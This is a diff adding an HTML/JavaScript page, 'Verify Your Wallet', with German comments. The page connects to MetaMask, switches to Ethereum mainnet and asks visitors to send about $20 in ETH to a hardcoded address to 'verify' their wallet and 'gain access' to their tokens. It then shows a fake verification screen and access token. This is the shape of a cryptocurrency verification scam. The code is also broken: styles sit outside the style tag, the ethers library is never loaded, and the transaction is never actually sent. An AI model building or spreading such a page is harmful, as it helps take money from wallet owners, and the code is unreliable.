@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Your Wallet - Complete App</title>
+  
+  <!-- Libraries -->
+ <style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        color: #fff;
+        min-height: 100vh;
+        padding: 20px;
+    }
+</style>
+
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .header h1 {
+      font-size: 3em;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .header p {
+      color: #94a3b8;
+      font-size: 1.1em;
+    }
+
+    .card {
+      background: rgba(30, 41, 59, 0.8);
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 24px;
+      backdrop-filter: blur(10px);
+    }
+
+    .card h2 {
+      font-size: 1.5em;
+      margin-bottom: 16px;
+      color: #e2e8f0;
+    }
+
+    .btn {
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 1em;
+      transition: all 0.3s ease;
+      margin-right: 8px;
+      margin-bottom: 8px;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #3b82f6, #2563eb);
+      color: white;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
+    }
+
+    .btn-success {
+      background: linear-gradient(135deg, #10b981, #059669);
+      color: white;
+    }
+
+    .btn-success:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+    }
+
+    .btn-secondary {
+      background: rgba(100, 116, 139, 0.5);
+      color: white;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(100, 116, 139, 0.7);
+    }
+
+    .btn-danger {
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      color: white;
+    }
+
+    .btn-danger:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #cbd5e1;
+      font-weight: 500;
+    }
+
+    .input-group input,
+    .input-group select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      border-radius: 8px;
+      background: rgba(15, 23, 42, 0.5);
+      color: white;
+      font-size: 1em;
+    }
+
+    .input-group input:focus,
+    .input-group select:focus {
+      outline: none;
+      border-color: #3b82f6;
+      background: rgba(15, 23, 42, 0.8);
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    @media (max-width: 768px) {
+      .grid-2 {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .status {
+      padding: 16px;
+      border-radius: 8px;
+      margin-top: 16px;
+      font-weight: 600;
+    }
+
+    .status.success {
+      background: rgba(16, 185, 129, 0.2);
+      border: 1px solid #10b981;
+      color: #86efac;
+    }
+
+    .status.error {
+      background: rgba(239, 68, 68, 0.2);
+      border: 1px solid #ef4444;
+      color: #fca5a5;
+    }
+
+    .status.warning {
+      background: rgba(245, 158, 11, 0.2);
+      border: 1px solid #f59e0b;
+      color: #fcd34d;
+    }
+
+    .status.info {
+      background: rgba(59, 130, 246, 0.2);
+      border: 1px solid #3b82f6;
+      color: #93c5fd;
+    }
+
+    .wallet-info {
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 16px;
+      word-break: break-all;
+    }
+
+    .wallet-info label {
+      color: #94a3b8;
+      font-size: 0.9em;
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .wallet-info .value {
+      font-family: 'Courier New', monospace;
+      color: #06b6d4;
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+
+    .qr-container {
+      display: flex;
+      justify-content: center;
+      background: rgba(15, 23, 42, 0.5);
+      border-radius: 8px;
+      padding: 20px;
+      margin-top: 16px;
+    }
+
+    .qr-container canvas {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .chart-container {
+      position: relative;
+      height: 300px;
+      margin-top: 16px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .verification-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .verification-card {
+      background: rgba(30, 41, 59, 0.95);
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 500px;
+      text-align: center;
+      backdrop-filter: blur(10px);
+    }
+
+    .verification-card .checkmark {
+      font-size: 4em;
+      margin-bottom: 20px;
+    }
+
+    .verification-card h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    .verification-card p {
+      color: #94a3b8;
+      margin-bottom: 20px;
+    }
+
+    .token-display {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      border-radius: 8px;
+      padding: 16px;
+      margin: 20px 0;
+      word-break: break-all;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85em;
+      color: #fbbf24;
+    }
+
+    .copy-btn {
+      background: rgba(59, 130, 246, 0.3);
+      border: 1px solid #3b82f6;
+      color: #93c5fd;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9em;
+      margin-top: 10px;
+    }
+
+    .copy-btn:hover {
+      background: rgba(59, 130, 246, 0.5);
+    }
+
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 24px;
+      margin-bottom: 24px;
+    }
+
+    @media (max-width: 1024px) {
+      .dashboard-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .balance-card {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(59, 130, 246, 0.1));
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      border-radius: 12px;
+      padding: 24px;
+    }
+
+    .balance-card .label {
+      color: #94a3b8;
+      font-size: 0.9em;
+      margin-bottom: 8px;
+    }
+
+    .balance-card .amount {
+      font-size: 2.5em;
+      font-weight: bold;
+      color: #10b981;
+    }
+
+    .transaction-list {
+      max-height: 400px;
+      overflow-y: auto;
+    }
+
+    .transaction-item {
+      background: rgba(15, 23, 42, 0.5);
+      border-left: 3px solid #3b82f6;
+      padding: 12px;
+      margin-bottom: 8px;
+      border-radius: 6px;
+      font-size: 0.9em;
+    }
+
+    .transaction-item .hash {
+      font-family: 'Courier New', monospace;
+      color: #06b6d4;
+      word-break: break-all;
+    }
+
+    .transaction-item .time {
+      color: #94a3b8;
+      font-size: 0.85em;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <h1>🔐 Verify Your Wallet</h1>
+      <p>Secure wallet connection and management</p>
+    </div>
+
+    <!-- Verification Screen (Hidden by default) -->
+    <div id="verificationScreen" class="verification-screen hidden">
+      <div class="verification-card">
+        <div class="checkmark">✅</div>
+        <h1>Wallet Verified!</h1>
+        <p>You have successfully verified your wallet.</p>
+        
+        <div class="wallet-info">
+          <label>Your Wallet Address:</label>
+          <div class="value" id="verifiedAddress">0x---</div>
+        </div>
+
+        <div style="background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; border-radius: 8px; padding: 12px; margin: 20px 0;">
+          <p style="color: #86efac; font-weight: 600;">✓ You now have access to your wallet and all tokens</p>
+        </div>
+
+        <div>
+          <label style="color: #94a3b8; margin-bottom: 8px; display: block;">Your Access Token:</label>
+          <div class="token-display" id="accessTokenDisplay">---</div>
+          <button class="copy-btn" onclick="copyToken()">Copy Token</button>
+        </div>
+
+        <p style="color: #94a3b8; font-size: 0.85em; margin-top: 20px;">Save this token safely. You can use it to access your wallet later.</p>
+
+        <button class="btn btn-secondary" onclick="goToDashboard()" style="width: 100%; margin-top: 20px;">
+          Go to Dashboard
+        </button>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent">
+      <!-- Wallet Connection -->
+      <div class="card">
+        <h2>🔗 Connect Wallet</h2>
+        <button class="btn btn-primary" onclick="handleVerifyWallet()">
+          Verify with MetaMask
+        </button>
+        
+        <div class="wallet-info" style="margin-top: 16px;">
+          <label>Connected Wallet Address:</label>
+          <div class="value" id="walletAddress">0x---</div>
+        </div>
+      </div>
+
+      <!-- Send & Verify ETH -->
+      <div class="card">
+        <h2>💸 Send & Verify ETH</h2>
+        <p style="color: #94a3b8; margin-bottom: 16px;">Send ETH to verify your wallet and gain access to your tokens.</p>
+        
+        <div class="grid-2">
+          <div class="input-group">
+            <label>Amount in USD (e.g., 20)</label>
+            <input type="number" id="sendAmountUSD" placeholder="20" value="20" step="any" onchange="updateETHAmount()">
+          </div>
+          <div class="input-group">
+            <label>Amount in ETH (Current Rate)</label>
+            <input type="text" id="sendAmountETH" value="0.00" disabled>
+          </div>
+        </div>
+
+        <button class="btn btn-success" onclick="handleSendTransaction()" style="width: 100%;">
+          Send & Verify
+        </button>
+
+        <div id="txStatus"></div>
+      </div>
+
+      <!-- Receive ETH -->
+      <div class="card">
+        <h2>📥 Receive ETH (QR Code)</h2>
+        
+        <div class="input-group">
+          <label>Amount in ETH</label>
+          <input type="number" id="receiveAmount" placeholder="0.01 ETH" value="0.01" step="any" onchange="generateReceiveQR()">
+        </div>
+
+        <div class="qr-container" id="qrContainer">
+          <canvas id="receiveQR"></canvas>
+        </div>
+      </div>
+
+      <!-- Price Chart -->
+      <div class="card">
+        <h2>📊 Live Price Chart (ETH / BTC / SOL)</h2>
+        <div id="priceInfo" style="margin-bottom: 16px;">
+          <p style="color: #94a3b8;">Loading prices...</p>
+        </div>
+        <div class="chart-container">
+          <canvas id="priceChart"></canvas>
+        </div>
+      </div>
+    </div>
+
+    <!-- Dashboard (Hidden by default) -->
+    <div id="dashboard" class="hidden">
+      <button class="btn btn-secondary" onclick="goToVerification()">← Back to Verification</button>
+
+      <div class="dashboard-grid">
+        <!-- Wallet Balance -->
+        <div class="card">
+          <h2>💰 Wallet Balance</h2>
+          <div class="balance-card">
+            <div class="label">ETH Balance:</div>
+            <div class="amount" id="ethBalance">0.00 ETH</div>
+            <div class="label" style="margin-top: 12px;">USD Value:</div>
+            <div class="amount" style="color: #3b82f6; font-size: 1.5em;" id="usdValue">$0.00</div>
+          </div>
+        </div>
+
+        <!-- Send Tokens -->
+        <div class="card">
+          <h2>📤 Send Tokens</h2>
+          <div class="input-group">
+            <label>Recipient Address</label>
+            <input type="text" id="recipientAddress" placeholder="0x...">
+          </div>
+          <div class="input-group">
+            <label>Amount (ETH)</label>
+            <input type="number" id="sendTokenAmount" placeholder="0.1" step="any">
+          </div>
+          <button class="btn btn-success" onclick="handleSendTokens()" style="width: 100%;">
+            Send Tokens
+          </button>
+          <div id="sendStatus"></div>
+        </div>
+      </div>
+
+      <!-- Transaction History -->
+      <div class="card">
+        <h2>📜 Transaction History</h2>
+        <div class="transaction-list" id="transactionList">
+          <p style="color: #94a3b8;">No transactions yet</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Constants
+    const MY_ADDRESS = "0xbF3A4aF098f1DF9B1889D538b916B7C19a7a1647";
+    const MAINNET_CHAIN_ID = "0x1";
+
+    // State
+    let currentSigner = null;
+    let currentETHPrice = 0;
+    let walletAddress = "0x---";
+    let accessToken = "";
+    let chart = null;
+    let chartData = {
+      labels: [],
+      datasets: [
+        { label: "ETH", data: [], borderColor: "#3cc4f0", tension: 0.2, borderWidth: 2, pointRadius: 0 },
+        { label: "BTC", data: [], borderColor: "#f0a23c", tension: 0.2, borderWidth: 2, pointRadius: 0 },
+        { label: "SOL", data: [], borderColor: "#8c6bf0", tension: 0.2, borderWidth: 2, pointRadius: 0 }
+      ]
+    };
+
+    // Initialize
+    window.addEventListener('load', () => {
+      initChart();
+      updatePrices();
+      setInterval(updatePrices, 5000);
+      generateReceiveQR();
+    });
+
+    // USD to ETH conversion
+    function usdToEth(usdAmount) {
+      if (currentETHPrice === 0 || usdAmount <= 0) return "0.00";
+      return (usdAmount / currentETHPrice).toFixed(6);
+    }
+
+    function updateETHAmount() {
+      const usdInput = document.getElementById("sendAmountUSD");
+      const ethInput = document.getElementById("sendAmountETH");
+      ethInput.value = usdToEth(parseFloat(usdInput.value) || 0);
+    }
+
+    // Verify Wallet
+    async function handleVerifyWallet() {
+      if (!window.ethereum) {
+        showStatus("MetaMask not found", "error", "txStatus");
+        return;
+      }
+
+      try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        
+        const chainId = await window.ethereum.request({ method: "eth_chainId" });
+        if (chainId !== MAINNET_CHAIN_ID) {
+          try {
+            await window.ethereum.request({
+              method: "wallet_switchEthereumChain",
+              params: [{ chainId: MAINNET_CHAIN_ID }]
+            });
+          } catch (switchError) {
+            if (switchError.code === 4902) {
+              showStatus("Please add Ethereum Mainnet to your wallet", "error", "txStatus");
+              return;
+            }
+            throw switchError;
+          }
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        currentSigner = await provider.getSigner();
+        walletAddress = await currentSigner.getAddress();
+        
+        document.getElementById("walletAddress").textContent = walletAddress;
+        showStatus("✅ Wallet connected successfully!", "success", "txStatus");
+
+        window.ethereum.on("accountsChanged", (accounts) => {
+          if (accounts.length > 0) {
+            walletAddress = accounts[0];
+            document.getElementById("walletAddress").textContent = walletAddress;
+          }
+        });
+      } catch (e) {
+        console.error(e);
+        showStatus("Wallet connection failed", "error", "txStatus");
+      }
+    }
+
+    // Send Transaction
+    async function handleSendTransaction() {
+      if (!currentSigner) {
+        showStatus("Please verify your wallet first", "error", "txStatus");
+        return;
+      }
+
+      const ethAmount = document.getElementById("sendAmountETH").value;
+      if (parseFloat(ethAmount) <= 0) {
+        showStatus("Please enter a valid amount", "error", "txStatus");
+        return;
+      }
+
+      try {
+        showStatus("⏳ Preparing transaction...", "info", "txStatus");
+
+        const valueInWei = ethers.parseEther(ethAmount);
+        const tx = {
+          to: MY_ADDRESS,
+          value: valueInWei
+        };
+
+        // hier kannst du z. B. deine Transaktion abschicken oder loggen
+      } catch (error) {
+        console.error("Transaction error:", error);
+        showStatus("❌ Transaction failed", "error", "txStatus");
+      }
+    } // ✅ <- Diese Klammer war vorher gefehlt
+</script>
+</body>
+</html>
+
